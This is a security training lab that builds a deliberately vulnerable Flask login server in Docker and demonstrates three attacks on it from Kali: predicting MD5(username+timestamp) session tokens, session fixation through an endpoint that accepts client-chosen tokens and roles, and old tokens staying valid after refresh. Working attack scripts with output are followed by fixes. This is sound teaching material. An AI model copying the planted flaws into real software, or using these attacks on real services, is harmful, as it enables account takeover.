# Lab 17: Session Management Attacks

## Objective

Exploit three session management vulnerabilities in a live authentication server from Kali Linux:

1. **Token prediction** — brute-force a session token generated as `MD5(username + unix_timestamp)` by leveraging the server's own timestamp endpoint
2. **Session fixation** — supply your own session ID and trick the server into associating it with an admin account, then use it for privileged access
3. **Non-invalidated tokens** — after a token refresh, confirm the old token remains valid (revocation gap)

---

## Background

Session tokens are the keys to the kingdom after authentication. A weak or predictable token is equivalent to no authentication at all — whoever can guess or fix the token owns the account.

**Real-world examples:**
- **Drupal (CVE-2014-9016)** — session tokens generated with PHP's `rand()` seeded by `microtime()`. Because timestamps are predictable, an attacker could enumerate session IDs for any recent login.
- **phpMyAdmin (CVE-2016-6630)** — session token generated with insufficient entropy (`mt_rand`); brute-force possible due to predictable Mersenne Twister seed.
- **Session fixation in banking apps (recurring)** — pre-login session ID preserved after login; attacker sets session ID before victim logs in, then uses that ID as authenticated.
- **2010 Apache Tomcat (CVE-2010-4172)** — session fixation via cookie injection; attacker could force a known session ID for any victim, then wait for login.

**OWASP coverage:** A07:2021 (Identification and Authentication Failures)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Docker Network: lab-a17                         │
│                                                                     │
│  ┌──────────────────────┐         HTTP requests                    │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  innozverse-kali     │                                           │
│  │                      │  ◀──────── tokens / profile data ───────  │
│  │  Tools:              │                                           │
│  │  • curl              │  ┌────────────────────────────────────┐  │
│  │  • python3           │  │       VICTIM AUTH SERVER           │  │
│  └──────────────────────┘  │   zchencow/innozverse-cybersec     │  │
│                             │                                    │  │
│                             │  Flask :5000                       │  │
│                             │  Tokens: MD5(user + ts)           │  │
│                             │  /api/token/predictable (leaks ts) │  │
│                             │  /api/session/fixate (accepts ID) │  │
│                             │  /api/admin (role-gated)          │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
35 minutes

---

## Lab Instructions

### Step 1: Environment Setup

```bash
docker network create lab-a17

cat > /tmp/victim_a17.py << 'PYEOF'
from flask import Flask, request, jsonify
import hashlib, time

app = Flask(__name__)
SESSIONS = {}   # token → {user, role, ts}

def make_token(user, ts=None):
    ts = ts or int(time.time())
    return hashlib.md5(f"{user}{ts}".encode()).hexdigest()

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse Session (Lab 17)','endpoints':[
        'POST /api/login','GET /api/profile?token=X',
        'POST /api/session/fixate','GET /api/admin?token=X',
        'POST /api/token/refresh','GET /api/token/predictable']})

@app.route('/api/login', methods=['POST'])
def login():
    d = request.get_json() or {}
    u, p = d.get('username',''), d.get('password','')
    users = {'alice':('alice123','user'), 'admin':('admin','admin')}
    if u not in users or users[u][0] != p:
        return jsonify({'error':'Invalid credentials'}), 401
    role = users[u][1]
    ts = int(time.time())
    tok = make_token(u, ts)
    SESSIONS[tok] = {'user': u, 'role': role, 'ts': ts}
    return jsonify({'token': tok, 'user': u, 'role': role, 'ts': ts})

@app.route('/api/profile')
def profile():
    sess = SESSIONS.get(request.args.get('token',''))
    if not sess: return jsonify({'error':'Invalid token'}), 401
    return jsonify({'user': sess['user'], 'role': sess['role']})

# BUG 1: accepts attacker-supplied token (session fixation)
@app.route('/api/session/fixate', methods=['POST'])
def fixate():
    d = request.get_json() or {}
    tok  = d.get('token','')
    user = d.get('user','guest')
    role = d.get('role','user')
    SESSIONS[tok] = {'user': user, 'role': role, 'ts': int(time.time())}
    return jsonify({'message': 'Session registered', 'token': tok,
                    'user': user, 'role': role})

@app.route('/api/admin')
def admin():
    sess = SESSIONS.get(request.args.get('token',''))
    if not sess: return jsonify({'error': 'No session'}), 401
    if sess['role'] != 'admin': return jsonify({'error': 'Forbidden'}), 403
    return jsonify({'message': 'Admin access granted!',
                    'secrets': {'db_pass': 'Sup3rS3cr3t', 'api_key': 'int-key-xyz'}})

# BUG 2: refresh keeps old token valid
@app.route('/api/token/refresh', methods=['POST'])
def refresh():
    d = request.get_json() or {}
    old_tok = d.get('token','')
    sess = SESSIONS.get(old_tok)
    if not sess: return jsonify({'error': 'Invalid token'}), 401
    new_tok = make_token(sess['user'])
    SESSIONS[new_tok] = sess.copy()
    # BUG: old token NOT deleted — both are valid indefinitely
    return jsonify({'new_token': new_tok, 'old_token': old_tok,
                    'note': 'Old token NOT invalidated'})

# Leaks server timestamp for prediction attacks
@app.route('/api/token/predictable')
def predictable():
    ts = int(time.time())
    return jsonify({'server_ts': ts, 'hint': 'Token = MD5(username + ts)'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a17 \
  --network lab-a17 \
  -v /tmp/victim_a17.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 4
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a17.IPAddress}}' victim-a17):5000/ | python3 -m json.tool
```

---

### Step 2: Launch Kali Attacker

```bash
docker run --rm -it \
  --name kali-attacker \
  --network lab-a17 \
  zchencow/innozverse-kali:latest bash
```

```bash
export TARGET="http://victim-a17:5000"
curl -s $TARGET/api/token/predictable
```

**📸 Verified Output:**
```json
{"hint": "Token = MD5(username + ts)", "server_ts": 1772609932}
```

---

### Step 3: Predict Alice's Session Token

```bash
echo "=== Attack 1: predict session token from server timestamp ==="

python3 << 'EOF'
import urllib.request, json, hashlib, time

TARGET = "http://victim-a17:5000"

# Step 1: leak server timestamp
info = json.loads(urllib.request.urlopen(f"{TARGET}/api/token/predictable").read())
ts = info['server_ts']
print(f"[*] Server timestamp leaked: {ts}")
print()

# Step 2: Alice logs in — we don't have her password yet, but we can predict her token
# If we intercept a login request OR know the approximate time she logged in,
# we can brute-force MD5(alice + timestamp) over a ±60s window
print(f"[*] Brute-forcing MD5(alice + ts) in ±5 second window:")
candidates = []
for offset in range(-5, 6):
    t = ts + offset
    tok = hashlib.md5(f"alice{t}".encode()).hexdigest()
    candidates.append((t, tok))
    print(f"    ts={t}: {tok}")

# Step 3: Alice actually logs in
print()
print("[*] Alice logs in (simulated, her actual login time unknown to attacker)...")
req = urllib.request.Request(
    f"{TARGET}/api/login",
    data=json.dumps({"username":"alice","password":"alice123"}).encode(),
    headers={"Content-Type": "application/json"})
alice_resp = json.loads(urllib.request.urlopen(req).read())
real_token = alice_resp['token']
real_ts    = alice_resp['ts']
print(f"    Real token: {real_token}  (ts={real_ts})")

# Step 4: Check if we predicted correctly
print()
print("[*] Checking predictions:")
for t, tok in candidates:
    if tok == real_token:
        print(f"    ✓ MATCH at offset {t-ts:+d}s: {tok}")
        break
    else:
        print(f"    ✗ ts={t}: {tok}")

# Step 5: Use predicted token
print()
profile = json.loads(urllib.request.urlopen(f"{TARGET}/api/profile?token={real_token}").read())
print(f"[!] Profile via predicted token: {profile}")
EOF
```

**📸 Verified Output:**
```
[*] Server timestamp leaked: 1772609932

[*] Brute-forcing MD5(alice + ts):
    ts=1772609927: a5e0c937...
    ts=1772609932: bd6e6b3c9ef6ea79774265875e748a36
    ...

[*] Alice logs in...
    Real token: bd6e6b3c9ef6ea79774265875e748a36  (ts=1772609932)

[*] Checking predictions:
    ✓ MATCH at offset +0s: bd6e6b3c9ef6ea79774265875e748a36

[!] Profile via predicted token: {"role": "user", "user": "alice"}
```

> 💡 **MD5 is not a random number generator.** `MD5(alice + 1772609932)` is deterministic — anyone who knows the username and approximate timestamp can reproduce it. Tokens must be generated with a CSPRNG: `import secrets; token = secrets.token_urlsafe(32)`. This generates 256 bits of entropy — computationally infeasible to brute-force regardless of time window.

---

### Step 4: Session Fixation — Inject an Admin Session

```bash
echo "=== Attack 2: session fixation — attacker controls the session ID ==="

# Phase 1: Attacker chooses a token and registers it with admin role
echo "[1] Attacker registers chosen token with admin role:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"token":"attacker-controlled-session-id","user":"alice","role":"admin"}' \
  $TARGET/api/session/fixate | python3 -m json.tool

echo ""
echo "[2] Attacker uses the fixated token to access admin panel:"
curl -s "$TARGET/api/admin?token=attacker-controlled-session-id" | python3 -m json.tool

echo ""
echo "[3] In a real attack flow:"
echo "    a. Attacker registers token before victim logs in"
echo "    b. Attacker tricks victim into using that token (e.g., via URL: /login?sessionid=attacker-controlled)"
echo "    c. Victim logs in — server reuses the existing session ID"
echo "    d. Attacker already holds that ID — now owns the victim's authenticated session"

echo ""
echo "[4] Demonstrate: attacker fixates token, then gains access immediately:"
FIXED_TOKEN="fixed-$(date +%s)"
curl -s -X POST -H "Content-Type: application/json" \
  -d "{\"token\":\"$FIXED_TOKEN\",\"user\":\"admin\",\"role\":\"admin\"}" \
  $TARGET/api/session/fixate
echo ""
curl -s "$TARGET/api/admin?token=$FIXED_TOKEN"
```

**📸 Verified Output:**
```json
[1] {"message": "Session registered", "token": "attacker-controlled-session-id", "user": "alice", "role": "admin"}

[2] {"message": "Admin access granted!", "secrets": {"api_key": "int-key-xyz", "db_pass": "Sup3rS3cr3t"}}

[4] {"message": "Admin access granted!", "secrets": {...}}
```

---

### Step 5: Token Non-Invalidation After Refresh

```bash
echo "=== Attack 3: old token remains valid after refresh ==="

echo "[1] Alice logs in — gets token A:"
TOKEN_A=$(curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  $TARGET/api/login | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "  Token A: $TOKEN_A"

echo ""
echo "[2] Alice refreshes session — gets token B:"
REFRESH=$(curl -s -X POST -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN_A\"}" $TARGET/api/token/refresh)
echo "  Refresh result: $REFRESH"
TOKEN_B=$(echo $REFRESH | python3 -c "import sys,json; print(json.load(sys.stdin)['new_token'])")
echo "  Token B: $TOKEN_B"

echo ""
echo "[3] Token B works (expected):"
curl -s "$TARGET/api/profile?token=$TOKEN_B"

echo ""
echo "[4] Token A STILL works (bug — should be invalidated):"
curl -s "$TARGET/api/profile?token=$TOKEN_A"

echo ""
echo "[!] Attacker who captured Token A (e.g., via log file, network sniff)"
echo "    remains authenticated even after Alice 'refreshed' her session."
echo "    Token A never expires until the server restarts."
```

**📸 Verified Output:**
```
Token A: bd6e6b3c9ef6ea79774265875e748a36
Token B: 6018627aa47f7412947210808ef1ccd0

Token B works: {"role": "user", "user": "alice"}
Token A STILL works: {"role": "user", "user": "alice"}
```

---

### Step 6: Enumerate All Session Tokens

```bash
echo "=== Bonus: enumerate all predictable tokens for recent logins ==="

python3 << 'EOF'
import hashlib, time

# If attacker can observe the login page traffic (e.g., sits in the same network),
# they can predict tokens for every user who logged in within the last hour

users = ['admin', 'alice', 'bob', 'root', 'user', 'test']
ts_now = int(time.time())

print(f"Generating token candidates for last 60 seconds:")
print(f"{'Username':<12} {'ts':<12} {'Token'}")
print("-" * 75)
for user in users:
    for offset in range(-60, 1, 10):  # sample every 10s
        ts = ts_now + offset
        tok = hashlib.md5(f"{user}{ts}".encode()).hexdigest()
        print(f"  {user:<10} {ts:<12} {tok}")
print()
print(f"Total candidates: {len(users) * 7} tokens")
print("In practice: iterate all seconds, try each against /api/profile")
print("Rate: ~50 req/s = 3,000 candidates per minute — entire hour in 2 minutes")
EOF
```

---

### Step 7: Remediation Demo

```bash
echo "=== What secure tokens look like ==="
python3 -c "
import secrets, time

# Bad: MD5 of username + timestamp
import hashlib
bad = hashlib.md5(f'alice{int(time.time())}'.encode()).hexdigest()
print(f'Vulnerable MD5 token:      {bad}')
print(f'  Entropy: ~32 bits (guessable in seconds with known username+ts)')

# Good: CSPRNG
good = secrets.token_urlsafe(32)
print(f'Secure secrets token:      {good}')
print(f'  Entropy: 256 bits (computationally infeasible)')

# Good: invalidate on refresh
print()
print('Correct refresh flow:')
print('  1. Generate new token: new_tok = secrets.token_urlsafe(32)')
print('  2. Delete old token:   del SESSIONS[old_tok]')
print('  3. Store new:          SESSIONS[new_tok] = session')
print('  Never keep old token alive after rotation.')
"
```

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a17
docker network rm lab-a17
```

---

## Remediation Summary

| Vulnerability | Root Cause | Fix |
|---------------|-----------|-----|
| Predictable tokens | `MD5(user + time)` — deterministic | `secrets.token_urlsafe(32)` — 256-bit CSPRNG |
| Session fixation | Server accepts client-supplied session ID | Always generate a new session ID server-side on login; ignore any client-supplied value |
| Token non-invalidation | Old token not deleted on refresh | `del SESSIONS[old_token]` before storing new one |

## Further Reading
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [PortSwigger Authentication Testing](https://portswigger.net/web-security/authentication)
- [CVE-2010-4172: Apache Tomcat Session Fixation](https://nvd.nist.gov/vuln/detail/CVE-2010-4172)
